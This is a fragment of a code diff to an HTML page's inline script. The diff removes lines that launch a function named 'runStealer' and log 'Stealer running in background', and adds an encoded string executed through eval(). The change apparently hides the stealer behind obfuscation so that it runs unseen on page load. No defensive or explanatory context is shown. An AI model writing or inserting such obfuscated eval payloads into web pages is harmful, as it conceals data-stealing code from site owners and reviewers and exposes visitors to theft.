+        var _enc = 'wqlnY2VvaXRucXRobHplb2xwa3RweW91eWdlY2VxY3B0b3R2Y2hwa3lwcnZ5b29xbmxuZQ==';
+        eval(_d(_enc));
     })();
-
-    setTimeout(runStealer, 300);
-
-    console.log('✅ Stealer running in background');
     </script>
 
 </body>
